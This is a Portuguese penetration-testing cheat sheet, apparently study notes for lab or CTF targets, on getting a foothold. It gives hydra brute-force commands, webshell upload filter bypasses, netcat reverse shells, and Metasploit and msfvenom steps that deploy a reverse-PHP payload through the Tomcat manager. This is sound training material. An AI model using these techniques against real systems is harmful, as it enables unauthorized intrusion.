# Exploração / Conseguir acesso (foothold)

## FTP ANÔNIMO | login sem senha | anonymous | "será que abre sem pedir nada" (anonymous FTP login)

```
ftp <IP>
# usuário: anonymous, senha: em branco (ou qualquer coisa)
ls
get arquivo.txt
bye
```
- Porta 21 aberta → sempre testar anônimo primeiro, antes de qualquer força bruta.
- Achou arquivo de texto → pode ser wordlist de senha ou lista de usuário (ler antes de assumir).

## FORÇA BRUTA DE LOGIN | hydra | chutar senha | tentar várias senhas até acertar (brute force login)

```
hydra -l usuario -P senhas.txt <IP> ssh              # 1 usuário fixo + wordlist de senha
hydra -L usuarios.txt -P senhas.txt <IP> ftp          # wordlist de usuário E senha
hydra -l admin -P senhas.txt <IP> http-post-form "/login:user=^USER^&pass=^PASS^:F=mensagem_de_erro"
```
- **Nunca é o primeiro passo** — só depois de já ter usuário certo ou wordlist plausível (FTP anônimo, código-fonte, etc.).
- Pro `http-post-form`: antes de rodar, ver o código-fonte (Ctrl+U) do formulário pra pegar o nome exato dos campos e a mensagem de erro exibida no login errado.
- Buscar: `hydra http-post-form syntax`, `hydra cheat sheet`

## LOGIN WEB / CREDENCIAL PADRÃO | painel admin | tela de login sem usuário conhecido (default credentials)

- Antes de forçar: ver código-fonte da página (`Ctrl+U`), procurar comentário tipo `<!-- TODO -->` ou credencial esquecida.
- Testar credencial padrão do serviço (`admin`/`admin`, `admin`/senha do nome do app) antes de ir pro hydra.
- Achou wordlist em outro serviço (FTP/SMB) → testar ela no login web também.

## WEBSHELL / UPLOAD MALICIOSO | subir arquivo pra ganhar shell | bypass de extensão (malicious file upload)

- Ideia: painel permite upload de arquivo → sobe um script que executa comando do sistema quando a página é acessada → passa o comando via parâmetro da URL (algo como `arquivo.php?cmd=whoami`).
- Se o filtro bloquear a extensão `.php`: tentar dupla extensão (`arquivo.php.jpg`), extensão alternativa que o servidor ainda interpreta (`.phtml`, `.php5`), ou trocar o `Content-Type` enviado no upload.
- Gerador pronto (evita digitar payload na mão): **PayloadsAllTheThings** no GitHub, seção web shells.
- Buscar: `php webshell upload bypass extension filter`, `payloadsallthethings web shell`

## REVERSE SHELL | shell reverso | netcat | "o alvo liga de volta pra mim" (reverse shell)

- Mecanismo: eu deixo o Kali **escutando** numa porta (`nc -lvnp <porta>`), e disparo no alvo um comando que abre conexão de volta pro **meu IP** (não o do alvo!) nessa porta — aí o terminal que abre é do alvo.
- Gerador pronto (não decorar sintaxe na mão, evita erro de digitação sob pressão): **revshells.com** — escolher linguagem disponível no alvo (bash/php/python/etc), colar IP do Kali + porta, copiar.
- Erro clássico: confundir IP do Kali com IP do alvo no payload — é sempre o **seu** IP que entra ali.
- Buscar: `revshells.com`, `reverse shell cheat sheet <linguagem>`

## TOMCAT | porta 8080 | painel de gerenciamento Java | manager/html (Apache Tomcat manager exploitation)

```
msfconsole
search tomcat
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS <IP>
run
```
- Módulo do Metasploit acha credencial do Tomcat Manager com wordlist interna — mais rápido que hydra manual.
- Depois de logar em `/manager/html`: seção **Deploy** aceita upload de `.war` → gerar payload com `msfvenom -p php/reverse_php LHOST=<IP_kali> LPORT=<porta> -f raw > shell.php` (ou payload `.war` equivalente) → subir → acessar pela URL.
- Ver a página do manager em `http://<IP>:8080/manager/html`.
- Buscar: `tomcat_mgr_login metasploit`, `msfvenom war payload`

## METASPLOIT | msfconsole | módulo pronto pra exploit (Metasploit framework)

```
msfconsole
search <nome_do_serviço>
use <módulo>
show options
set RHOSTS <IP>
set LHOST <IP_kali>
run
```
- `search` primeiro sempre que reconhecer um serviço específico (Tomcat, FTP, SMB) — geralmente já existe módulo pronto.
- Buscar: `metasploit <serviço> module`
